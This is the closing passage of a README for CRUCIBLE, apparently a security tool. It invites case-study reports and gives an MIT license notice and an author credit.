If you are using CRUCIBLE in production or integrating it into an enterprise security program, please open an issue tagged `[case-study]`. Hearing how it is used helps prioritize what to build next.

---

## 📄 License

MIT. See [LICENSE](LICENSE).

---

<div align="center">

Built by **[Sanjoy Ghosh](https://github.com/sanjoy1234)**

*CRUCIBLE — because the code that survives the fire is the code worth shipping.*

</div>
